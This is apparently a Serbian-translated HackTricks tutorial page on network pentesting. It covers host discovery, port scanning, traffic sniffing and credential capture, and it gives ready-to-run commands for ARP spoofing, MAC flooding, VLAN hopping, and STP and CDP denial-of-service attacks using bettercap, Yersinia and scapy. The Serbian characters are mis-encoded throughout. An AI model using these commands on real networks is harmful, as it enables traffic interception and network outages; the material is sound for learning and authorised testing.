# Pentesting Network

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Discovering hosts from the outside

Ovo Ä‡e biti **kratka sekcija** o tome kako pronaÄ‡i **IP adrese koje odgovaraju** sa **Interneta**.\
U ovoj situaciji imate neki **opseg IP adresa** (moÅ¾da Äak i nekoliko **raspona**) i samo treba da pronaÄ‘ete **koje IP adrese odgovaraju**.

### ICMP

Ovo je **najlakÅ¡i** i **najbrÅ¾i** naÄin da otkrijete da li je host aktivan ili ne.\
MoÅ¾ete pokuÅ¡ati da poÅ¡aljete neke **ICMP** pakete i **oÄekujete odgovore**. NajlakÅ¡i naÄin je jednostavno slanje **echo zahteva** i oÄekivanje odgovora. To moÅ¾ete uraditi koristeÄ‡i jednostavan `ping` ili koristeÄ‡i `fping` za **raspone**.\
TakoÄ‘e moÅ¾ete koristiti **nmap** da poÅ¡aljete druge tipove ICMP paketa (to Ä‡e izbeÄ‡i filtere za uobiÄajene ICMP echo zahtev-odgovor).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Veoma je uobiÄajeno da se svi tipovi ICMP paketa filtriraju. Tada, sve Å¡to moÅ¾ete da uradite da proverite da li je host aktivan je **pokuÅ¡ati da pronaÄ‘ete otvorene portove**. Svaki host ima **65535 portova**, tako da, ako imate "veliki" opseg, **ne moÅ¾ete** testirati da li je **svaki port** svakog hosta otvoren ili ne, to Ä‡e potrajati previÅ¡e vremena.\
Tada, ono Å¡to vam je potrebno je **brzi skener portova** ([masscan](https://github.com/robertdavidgraham/masscan)) i lista **najÄeÅ¡Ä‡e koriÅ¡Ä‡enih portova:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
MoÅ¾ete takoÄ‘e izvrÅ¡iti ovaj korak sa `nmap`, ali je sporije i `nmap` ima problema sa identifikovanjem aktivnih hostova.

### HTTP Port Discovery

Ovo je samo otkrivanje TCP portova korisno kada Å¾elite da **fokusirate na otkrivanje HTTP** **usluga**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

MoÅ¾ete takoÄ‘e pokuÅ¡ati da proverite da li je neki **UDP port otvoren** kako biste odluÄili da li treba da **obratite viÅ¡e paÅ¾nje** na **host.** PoÅ¡to UDP servisi obiÄno **ne odgovaraju** sa **bilo kojim podacima** na obiÄan prazan UDP probe paket, teÅ¡ko je reÄ‡i da li je port filtriran ili otvoren. NajlakÅ¡i naÄin da to odluÄite je da poÅ¡aljete paket vezan za aktivnu uslugu, a poÅ¡to ne znate koja usluga radi, trebali biste probati najverovatniju na osnovu broja porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Nmap linija predloÅ¾ena ranije Ä‡e testirati **top 1000 UDP portova** na svakom hostu unutar **/24** opsega, ali Äak i to Ä‡e trajati **>20min**. Ako su potrebni **najbrÅ¾i rezultati**, moÅ¾ete koristiti [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Ovo Ä‡e poslati ove **UDP probe** na njihov **oÄekivani port** (za /24 opseg ovo Ä‡e trajati samo 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Ovde moÅ¾ete pronaÄ‡i dobar vodiÄ o svim poznatim Wifi napadima u vreme pisanja:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## OtkriÄ‡e hostova iznutra

Ako ste unutar mreÅ¾e, jedna od prvih stvari koje Ä‡ete Å¾eleti da uradite je da **otkrijete druge hostove**. U zavisnosti od **koliko buke** moÅ¾ete/Å¾elite da napravite, razliÄite akcije se mogu izvesti:

### Pasivno

MoÅ¾ete koristiti ove alate za pasivno otkrivanje hostova unutar povezane mreÅ¾e:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

Napomena da se tehnike komentarisane u [_**Otkrivanju hostova sa spoljne strane**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) takoÄ‘e mogu **primeniti ovde**.\
Ali, poÅ¡to ste u **isto mreÅ¾i** kao i ostali hostovi, moÅ¾ete raditi **viÅ¡e stvari**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Napomena da se tehnike komentarisane u _Otkrivanju hostova sa spolja_ ([_**ICMP**_](./#icmp)) takoÄ‘e mogu **primeniti ovde**.\
Ali, poÅ¡to ste u **istoj mreÅ¾i** kao i ostali hostovi, moÅ¾ete uraditi **viÅ¡e stvari**:

* Ako **pingujete** **adresu za emitovanje podmreÅ¾e**, ping bi trebao da stigne do **svakog hosta** i oni bi mogli da **odgovore** **vama**: `ping -b 10.10.5.255`
* Pinging **adresu za emitovanje mreÅ¾e** mogli biste Äak pronaÄ‡i hostove unutar **drugih podmreÅ¾a**: `ping -b 255.255.255.255`
* Koristite `-PE`, `-PP`, `-PM` zastavice `nmap` za otkrivanje hostova slanjem **ICMPv4 echo**, **vremenskih oznaka**, i **zahteva za masku podmreÅ¾e:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan se koristi za **ukljuÄivanje** raÄunara putem **mreÅ¾ne poruke**. MagiÄni paket koji se koristi za ukljuÄivanje raÄunara je samo paket u kojem je **MAC Dst** naveden, a zatim se **ponavlja 16 puta** unutar istog paketa.\
Ove vrste paketa se obiÄno Å¡alju u **ethernet 0x0842** ili u **UDP paket na port 9**.\
Ako **nema \[MAC]** naveden, paket se Å¡alje na **emitovanje ethernet** (a emitovani MAC Ä‡e biti onaj koji se ponavlja).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skenerisanje hostova

Kada otkrijete sve IP adrese (spoljaÅ¡nje ili unutraÅ¡nje) koje Å¾elite detaljno skenirati, mogu se izvrÅ¡iti razliÄite radnje.

### TCP

* **Otvoren** port: _SYN --> SYN/ACK --> RST_
* **Zatvoren** port: _SYN --> RST/ACK_
* **Filtriran** port: _SYN --> \[NEMA ODGOVORA]_
* **Filtriran** port: _SYN --> ICMP poruka_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Postoje 2 opcije za skeniranje UDP porta:

* PoÅ¡aljite **UDP paket** i proverite odgovor _**ICMP unreachable**_ ako je port **zatvoren** (u nekoliko sluÄajeva ICMP Ä‡e biti **filtriran** pa neÄ‡ete dobiti nikakve informacije ako je port zatvoren ili otvoren).
* PoÅ¡aljite **formatirane datagrame** da izazovete odgovor od **usluge** (npr., DNS, DHCP, TFTP i druge, kako je navedeno u _nmap-payloads_). Ako dobijete **odgovor**, onda je port **otvoren**.

**Nmap** Ä‡e **kombinovati obe** opcije koristeÄ‡i "-sV" (UDP skeniranja su veoma spora), ali imajte na umu da su UDP skeniranja sporija od TCP skeniranja:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** je dizajniran da se koristi zajedno sa **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Njegova glavna svrha je da olakÅ¡a transport telefonskih podataka preko IP mreÅ¾a, odraÅ¾avajuÄ‡i mnoge karakteristike pouzdanosti koje se nalaze u **Signaling System 7 (SS7)**. **SCTP** je osnovna komponenta **SIGTRAN** protokol porodice, koja ima za cilj transport SS7 signala preko IP mreÅ¾a.

PodrÅ¡ku za **SCTP** pruÅ¾aju razliÄiti operativni sistemi, kao Å¡to su **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, i **VxWorks**, Å¡to ukazuje na njegovu Å¡iroku prihvaÄ‡enost i korisnost u oblasti telekomunikacija i umreÅ¾avanja.

Dva razliÄita skeniranja za SCTP nudi nmap: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS i IPS izbegavanje

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **ViÅ¡e nmap opcija**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Otkivanje unutraÅ¡njih IP adresa

**PogreÅ¡no konfigurisani ruteri, vatrozidi i mreÅ¾ni ureÄ‘aji** ponekad odgovaraju na mreÅ¾ne probe koristeÄ‡i **nejavne izvore adresa**. **tcpdump** se moÅ¾e koristiti za identifikaciju paketa primljenih sa privatnih adresa tokom testiranja. Konkretno, na Kali Linux-u, paketi se mogu uhvatiti na **eth2 interfejsu**, koji je dostupan sa javnog Interneta. VaÅ¾no je napomenuti da, ako je vaÅ¡a konfiguracija iza NAT-a ili vatrozida, takvi paketi verovatno neÄ‡e biti propuÅ¡teni.
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing moÅ¾ete saznati detalje o IP opsezima, veliÄinama podmreÅ¾a, MAC adresama i nazivima hostova pregledanjem uhvaÄ‡enih okvira i paketa. Ako je mreÅ¾a pogreÅ¡no konfigurisana ili je switching fabric pod stresom, napadaÄi mogu uhvatiti osetljive materijale putem pasivnog mreÅ¾nog sniffinga.

Ako je preklopna Ethernet mreÅ¾a pravilno konfigurisana, videÄ‡ete samo broadcast okvire i materijale namenjene vaÅ¡oj MAC adresi.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
MoÅ¾e se takoÄ‘e uhvatiti pakete sa udaljenog raÄunara preko SSH sesije koristeÄ‡i Wireshark kao GUI u realnom vremenu.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

OÄigledno.

### Capturing credentials

MoÅ¾ete koristiti alate kao Å¡to su [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) za parsiranje kredencijala iz pcap-a ili sa aktivnog interfejsa.

## LAN attacks

### ARP spoofing

ARP Spoofing se sastoji od slanja besplatnih ARP odgovora kako bi se naznaÄilo da IP maÅ¡ine ima MAC naÅ¡eg ureÄ‘aja. Tada Ä‡e Å¾rtva promeniti ARP tabelu i kontaktirati naÅ¡u maÅ¡inu svaki put kada Å¾eli da kontaktira IP koji je spoofovan.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Preplavite CAM tabelu prekidaÄa slanjem velikog broja paketa sa razliÄitim izvornih MAC adresama. Kada je CAM tabela puna, prekidaÄ poÄinje da se ponaÅ¡a kao hub (Å¡alje sve saobraÄ‡aje u broadcast).
```bash
macof -i <interface>
```
U modernim prekidaÄima ova ranjivost je ispravljena.

### 802.1Q VLAN / DTP Napadi

#### DinamiÄko Trunkovanje

**Dynamic Trunking Protocol (DTP)** je dizajniran kao protokol na link nivou kako bi olakÅ¡ao automatski sistem za trunkovanje, omoguÄ‡avajuÄ‡i prekidaÄima da automatski biraju portove za trunk mod (Trunk) ili non-trunk mod. Implementacija **DTP** se Äesto smatra pokazateljem suboptimalnog dizajna mreÅ¾e, naglaÅ¡avajuÄ‡i vaÅ¾nost ruÄne konfiguracije trunkova samo gde je to neophodno i osiguranje pravilne dokumentacije.

Podrazumevano, portovi prekidaÄa su postavljeni da rade u Dynamic Auto modu, Å¡to znaÄi da su spremni da iniciraju trunkovanje ako ih susedni prekidaÄ pozove. Bezbednosna zabrinutost se javlja kada pentester ili napadaÄ poveÅ¾e na prekidaÄ i poÅ¡alje DTP Desirable okvir, primoravajuÄ‡i port da preÄ‘e u trunk mod. Ova akcija omoguÄ‡ava napadaÄu da enumeriÅ¡e VLAN-ove kroz analizu STP okvira i zaobiÄ‘e VLAN segmentaciju postavljanjem virtuelnih interfejsa.

Prisutnost DTP u mnogim prekidaÄima podrazumevano moÅ¾e biti iskoriÅ¡Ä‡ena od strane protivnika da oponaÅ¡a ponaÅ¡anje prekidaÄa, Äime se stiÄe pristup saobraÄ‡aju kroz sve VLAN-ove. Skripta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se koristi za praÄ‡enje interfejsa, otkrivajuÄ‡i da li je prekidaÄ u Default, Trunk, Dynamic, Auto ili Access moduâ€”potonji je jedina konfiguracija imuna na VLAN hopping napade. Ovaj alat procenjuje status ranjivosti prekidaÄa.

Ukoliko se identifikuje ranjivost mreÅ¾e, alat _**Yersinia**_ moÅ¾e biti koriÅ¡Ä‡en za "omoguÄ‡avanje trunkovanja" putem DTP protokola, omoguÄ‡avajuÄ‡i posmatranje paketa iz svih VLAN-ova.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

Da biste enumerisali VLAN-ove, takoÄ‘e je moguÄ‡e generisati DTP Desirable okvir pomoÄ‡u skripte [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. **Ne prekidajte skriptu ni pod kojim okolnostima. Ona injektuje DTP Desirable svake tri sekunde. **DinamÄki kreirani trunk kanali na switch-u Å¾ive samo pet minuta. Nakon pet minuta, trunk se gasi.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Å½eleo bih da naglasim da **Access/Desirable (0x03)** oznaÄava da je DTP okvir tipa Desirable, Å¡to govori portu da preÄ‘e u Trunk reÅ¾im. A **802.1Q/802.1Q (0xa5)** oznaÄava tip enkapsulacije **802.1Q**.

Analizom STP okvira, **saznajemo o postojanju VLAN 30 i VLAN 60.**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Napad na specifiÄne VLAN-ove

Kada znate VLAN ID-ove i IP vrednosti, moÅ¾ete **konfigurisati virtuelno suÄelje za napad na specifiÄan VLAN**.\
Ako DHCP nije dostupan, koristite _ifconfig_ da postavite statiÄku IP adresu.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Napad o kojem se govori, **Dynamic Trunking i kreiranje virtuelnih interfejsa za otkrivanje hostova unutar** drugih VLAN-ova se **automatski izvrÅ¡ava** alatom: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Ako napadaÄ zna vrednost **MAC, IP i VLAN ID Å¾rtve**, mogao bi pokuÅ¡ati da **duplo oznaÄi okvir** sa njegovim dodeljenim VLAN-om i VLAN-om Å¾rtve i poÅ¡alje paket. Kako **Å¾rtva neÄ‡e moÄ‡i da se poveÅ¾e nazad** sa napadaÄem, **najbolja opcija za napadaÄa je komunikacija putem UDP-a** sa protokolima koji mogu izvrÅ¡iti neke zanimljive akcije (kao Å¡to je SNMP).

Druga opcija za napadaÄa je da pokrene **TCP port skeniranje laÅ¾irajuÄ‡i IP koji kontroliÅ¡e napadaÄ i koji je dostupan Å¾rtvi** (verovatno putem interneta). Tada bi napadaÄ mogao da prisluÅ¡kuje na drugom hostu koji mu pripada ako primi neke pakete od Å¾rtve.

![](<../../.gitbook/assets/image (190).png>)

Da biste izvrÅ¡ili ovaj napad, moÅ¾ete koristiti scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Ako imate **pristup switch-u na koji ste direktno povezani**, imate moguÄ‡nost da **zaobiÄ‘ete VLAN segmentaciju** unutar mreÅ¾e. Jednostavno **prebacite port u trunk reÅ¾im** (poznat i kao trunk), kreirajte virtuelne interfejse sa ID-evima ciljanih VLAN-ova i konfiguriÅ¡ite IP adresu. MoÅ¾ete pokuÅ¡ati da zatraÅ¾ite adresu dinamiÄki (DHCP) ili je moÅ¾ete konfigurisati statiÄki. To zavisi od sluÄaja.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

U odreÄ‘enim okruÅ¾enjima, kao Å¡to su mreÅ¾e za goste, **izolacija portova (poznata i kao privatni VLAN)** postavke se implementiraju kako bi se spreÄilo da klijenti povezani na beÅ¾iÄni pristupnik direktno komuniciraju jedni s drugima. MeÄ‘utim, identifikovana je tehnika koja moÅ¾e zaobiÄ‡i ove mere izolacije. Ova tehnika koristi ili nedostatak mreÅ¾nih ACL-ova ili njihovu nepravilnu konfiguraciju, omoguÄ‡avajuÄ‡i IP paketima da se rutiraju kroz ruter kako bi doÅ¡li do drugog klijenta na istoj mreÅ¾i.

Napad se izvrÅ¡ava kreiranjem **paketa koji nosi IP adresu odrediÅ¡nog klijenta, ali sa MAC adresom rutera**. To uzrokuje da ruter greÅ¡kom prosledi paket ciljanom klijentu. Ovaj pristup je sliÄan onom koji se koristi u napadima sa dvostrukim oznaÄavanjem, gde se sposobnost kontrole hosta dostupnog Å¾rtvi koristi za iskoriÅ¡Ä‡avanje sigurnosne greÅ¡ke.

**KljuÄni koraci napada:**

1. **Kreiranje paketa:** Paket je posebno kreiran da ukljuÄuje IP adresu ciljanog klijenta, ali sa MAC adresom rutera.
2. **IskoriÅ¡Ä‡avanje ponaÅ¡anja rutera:** Kreirani paket se Å¡alje ka ruteru, koji, zbog konfiguracije, preusmerava paket ka ciljanom klijentu, zaobilazeÄ‡i izolaciju koju pruÅ¾aju privatne VLAN postavke.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralizuje upravljanje VLAN-ovima. Koristi revizione brojeve za odrÅ¾avanje integriteta VLAN baze podataka; svaka izmena poveÄ‡ava ovaj broj. Switch-evi usvajaju konfiguracije sa viÅ¡im revizionim brojevima, aÅ¾urirajuÄ‡i svoje VLAN baze podataka.

#### VTP Domain Roles

* **VTP Server:** Upravljanje VLAN-ovimaâ€”kreira, briÅ¡e, modifikuje. Emituje VTP obaveÅ¡tenja Älanovima domena.
* **VTP Client:** Prima VTP obaveÅ¡tenja kako bi sinhronizovao svoju VLAN bazu podataka. Ova uloga je ograniÄena od lokalnih modifikacija VLAN konfiguracije.
* **VTP Transparent:** Ne uÄestvuje u VTP aÅ¾uriranjima, ali prosleÄ‘uje VTP obaveÅ¡tenja. Nije pogoÄ‘en VTP napadima, odrÅ¾ava konstantan revizioni broj nula.

#### VTP Advertisement Types

* **Summary Advertisement:** Emituje ga VTP server svake 300 sekundi, noseÄ‡i suÅ¡tinske informacije o domenu.
* **Subset Advertisement:** Å alje se nakon promena u VLAN konfiguraciji.
* **Advertisement Request:** Izdaje ga VTP klijent da zatraÅ¾i Summary Advertisement, obiÄno kao odgovor na otkrivanje viÅ¡eg revizionog broja konfiguracije.

VTP ranjivosti su iskoristive iskljuÄivo putem trunk portova, jer VTP obaveÅ¡tenja cirkuliÅ¡u samo kroz njih. Post-DTP scenariji napada mogu se preusmeriti ka VTP-u. Alati poput Yersinia mogu olakÅ¡ati VTP napade, sa ciljem da uniÅ¡te VLAN bazu podataka, efikasno ometajuÄ‡i mreÅ¾u.

Napomena: Ova diskusija se odnosi na VTP verziju 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
U Yersinia-inom grafiÄkom reÅ¾imu, izaberite opciju za brisanje svih VTP VLAN-ova da biste oÄistili VLAN bazu podataka.

### STP Napadi

**Ako ne moÅ¾ete da uhvatite BPDU okvire na vaÅ¡im interfejsima, malo je verovatno da Ä‡ete uspeti u STP napadu.**

#### **STP BPDU DoS**

Slanjem velikog broja BPDUs TCP (ObaveÅ¡tenje o promeni topologije) ili Conf (BPDUs koji se Å¡alju kada se topologija kreira) prekidaÄi su preoptereÄ‡eni i prestaju da rade ispravno.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Kada se TCP poÅ¡alje, CAM tabela prekidaÄa Ä‡e biti obrisana za 15s. Tada, ako kontinuirano Å¡aljete ovu vrstu paketa, CAM tabela Ä‡e se neprekidno restartovati (ili svakih 15 sekundi) i kada se restartuje, prekidaÄ se ponaÅ¡a kao hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

NapadaÄ simulira ponaÅ¡anje prekidaÄa kako bi postao STP root mreÅ¾e. Tada Ä‡e viÅ¡e podataka prolaziti kroz njega. Ovo je zanimljivo kada ste povezani na dva razliÄita prekidaÄa.\
To se postiÅ¾e slanjem BPDUs CONF paketa koji govore da je **prioritet** vrednost manja od stvarnog prioriteta stvarnog root prekidaÄa.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Ako je napadaÄ povezan na 2 prekidaÄa, moÅ¾e postati koren novog stabla i sav saobraÄ‡aj izmeÄ‘u tih prekidaÄa Ä‡e prolaziti kroz njega** (biÄ‡e izvrÅ¡en MITM napad).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Napadi

CISCO Discovery Protocol (CDP) je kljuÄan za komunikaciju izmeÄ‘u CISCO ureÄ‘aja, omoguÄ‡avajuÄ‡i im da **identifikuju jedni druge i dele detalje konfiguracije**.

#### Pasivno prikupljanje podataka <a href="#id-0e0f" id="id-0e0f"></a>

CDP je podeÅ¡en da emituje informacije kroz sve portove, Å¡to moÅ¾e dovesti do bezbednosnog rizika. NapadaÄ, kada se poveÅ¾e na port prekidaÄa, moÅ¾e koristiti mreÅ¾ne sniffer-e kao Å¡to su **Wireshark**, **tcpdump** ili **Yersinia**. Ova akcija moÅ¾e otkriti osetljive podatke o mreÅ¾nom ureÄ‘aju, ukljuÄujuÄ‡i njegov model i verziju Cisco IOS-a koju koristi. NapadaÄ bi zatim mogao ciljati specifiÄne ranjivosti u identifikovanoj verziji Cisco IOS-a.

#### Indukcija CDP Tabele Preplavljivanja <a href="#id-0d6a" id="id-0d6a"></a>

Agresivniji pristup ukljuÄuje pokretanje napada uskraÄ‡ivanja usluge (DoS) preplavljivanjem memorije prekidaÄa, pretvarajuÄ‡i se da su legitimni CISCO ureÄ‘aji. Ispod je redosled komandi za iniciranje takvog napada koristeÄ‡i Yersinia, alat za testiranje mreÅ¾e:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Tokom ovog napada, CPU prekidaÄa i CDP tabela suseda su jako optereÄ‡eni, Å¡to dovodi do onoga Å¡to se Äesto naziva **â€œparaliza mreÅ¾eâ€** zbog prekomerne potroÅ¡nje resursa.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
MoÅ¾ete takoÄ‘e koristiti [**scapy**](https://github.com/secdev/scapy/). Obavezno ga instalirajte sa `scapy/contrib` paketom.

### VoIP napadi i VoIP Hopper alat

